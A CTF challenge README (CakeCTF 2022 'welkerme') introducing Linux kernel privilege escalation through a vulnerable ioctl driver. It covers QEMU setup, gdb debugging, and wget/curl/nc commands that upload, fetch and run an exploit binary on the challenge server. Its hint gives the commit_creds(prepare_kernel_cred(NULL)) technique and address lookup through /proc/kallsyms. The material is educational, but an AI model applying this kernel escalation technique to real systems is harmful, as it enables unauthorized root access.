# welkerme
Welcome to Kernel Exploit!
In this challenge, you're going to learn how to escalate privilege in Linux kernel.
The goal is to read the flag written in `/root/flag.txt` on the remote server.

## First Step
### Setup
Install qemu, cpio, and some developer tools.
```
# apt install qemu-system cpio gcc gdb make
```

### Run
You can run VM with the following command:
```
$ make run
```

### Debug
You can also debug QEMU. First, run the VM by
```
$ make debug
```
and then attach to port 12345 with gdb.
```
$ gdb
gdb> target remote localhost:12345
```
If you can't use this port number for some reason,
you can change it by changing the last line of `debug.sh`.

## Developing Exploit
The OS is running a vulnerable kernel module.
```
[ welkerme - CakeCTF 2022 ]
/ $ lsmod
Module                  Size  Used by    Tainted: G  
driver                 16384  0
```
You can find the source code of this driver in `src/driver.c`.
Probably you should check `module_ioctl` function :)

Edit `exploit.c` to develop your exploit.

## Testing on Remote
If you successfully finish writing your exploit,
you can try it on the remote server.

### Proof-of-Work
You will be asked to solve a Proof-of-Work first.
```
$ nc pwn2.2022.cakectf.com 9999
hashcash -mb26 x3.lIBh9s
hashcash token: 
```
Open a new terminal and keep the connection of the PoW above.
Install `hashcash` if you don't have one.
```
# apt install hashcash
```
Run the command given by the server and you'll get something like this:
```
$ hashcash -mb26 x3.lIBh9s
hashcash token: 1:26:220902:x3.libh9s::7icDDK3+4NzsByUH:00000002pd8m
hashcash -mb26 x3.lIBh9s  5.79s user 0.00s system 99% cpu 5.797 total
```
You must send the token to get access to the challenge.
```
$ nc pwn2.2022.cakectf.com 9999
hashcash -mb26 x3.lIBh9s
hashcash token: 
1:26:220902:x3.libh9s::7icDDK3+4NzsByUH:00000002pd8m
...
```
Feel free to ask admin on Discord if you have any trouble about PoW.

### Sending Your Exploit
If you have your own server, you can simply download your exploit
from your server. (HTTP only!)
```
/ $ cd /tmp
/tmp $ wget http://<your server>/exploit
```

If you don't have your own server, you may use [sprunge](http://sprunge.us/)
or [termbin](http://termbin.com/).
First, upload your exploit to the server.
```
# sprunge
$ base64 exploit | curl -F 'sprunge=<-' http://sprunge.us
http://sprunge.us/XXXXXX

# termbin (File size must be small enough)
$ base64 exploit | nc termbin.com 9999
https://termbin.com/YYYY
```
As shown in the example above, use base64 or the file may corrupt.
Also, be noted that termbin only accepts small files. You can use [musl-gcc](https://www.musl-libc.org/how.html) to make a small binary if you choose to use termbin.
After finishing upload, you can download the exploit from the URL generated.
```
/ $ cd /tmp

# sprunge
/tmp $ wget http://sprunge.us/XXXXXX -O exploit.b64
/tmp $ base64 -d exploit.b64 > exploit
/tmp $ chmod +x exploit

# termbin (Change https to http!)
/tmp $ wget http://termbin.com/YYYY -O exploit.b64
/tmp $ base64 -d exploit.b64 > exploit
/tmp $ chmod +x exploit
```

## Hint
The function `func` in `exploit.c` is executed in the kernel space by `CMD_EXEC`.
Basically, you want to run the following code in the kernel space to escalate privilege.
```c
commit_creds(prepare_kernel_cred(NULL));
```
`prepare_kernel_cred(NULL)` creates a new credential with the highest privilege.
`commit_creds(cred)` applies the credential to the caller process.

You can find the address of each function in `/proc/kallsyms`. (Use debug mode)
```
/ # grep commit_creds /proc/kallsyms 
ffffffff81072540 T commit_creds
```
Good luck!

## Good Readings
I believe this challenge is the easiest kernel exploit.
If you're stuck, however, the following websites may help you.
Be noted these posts explain a bit more complex exploit than this challenge.

- [Learning Linux Kernel Exploitation](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#the-simplest-exploit---ret2usr) by Midas (English)
- [Linux Kernel Exploit 内核漏洞学习(2)-ROP](https://bbs.pediy.com/thread-253377.htm#msg_header_h1_5) by 钞sir (Chinese)
- [PAWNYABLE!](https://pawnyable.cafe/linux-kernel/) by ptr-yudai (Japanese)
- [Exploit Tech: ret2usr](https://learn.dreamhack.io/82#t572) by Dreamhack (Korean)

Last but not least, Google search is always with you.
